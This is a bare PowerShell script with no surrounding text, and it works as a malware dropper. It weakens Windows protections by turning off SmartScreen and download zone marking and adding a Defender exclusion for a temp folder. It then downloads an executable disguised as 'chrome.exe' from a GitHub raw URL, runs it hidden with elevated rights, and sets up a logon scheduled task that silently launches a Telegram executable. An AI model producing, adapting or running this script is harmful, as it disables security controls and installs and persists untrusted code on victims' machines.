new-item "HKLM:\Software\Policies\Microsoft\Windows\System" -force | out-null
set-itemproperty -path "HKLM:\Software\Policies\Microsoft\Windows\System" -name "enablesmartscreen" -value 0 -force

new-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" -force | out-null
set-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" -name "savezoneinformation" -value 1 -force 

new-item "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -force | out-null
set-itemproperty -path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -name "submitsamplesconsent" -value 2 -force

new-item -itemtype directory -path "$env:temp\newfolder" -force | out-null

add-mppreference -exclusionpath "$env:temp\newfolder"

invoke-webrequest -uri "https://github.com/lion93934/test/raw/refs/heads/main/chrome.exe" -outfile "$env:temp\newfolder\chrome.exe" | out-null

start-process -filepath "$env:temp\newfolder\chrome.exe" -windowstyle hidden -verb runas

# startup

@'
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """C:\Users\barry\AppData\Roaming\Telegram Desktop\Telegram.exe""", 0, False
Set WshShell = Nothing
'@ | Set-Content -Path "$env:temp\newfolder\runtelegram.vbs"

$TaskName = "RunTelegramVBS"

$ScriptPath = "$env:temp\newfolder\runtelegram.vbs"

$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$ScriptPath`""

$Trigger = New-ScheduledTaskTrigger -AtLogOn

$Principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings | out-null 
















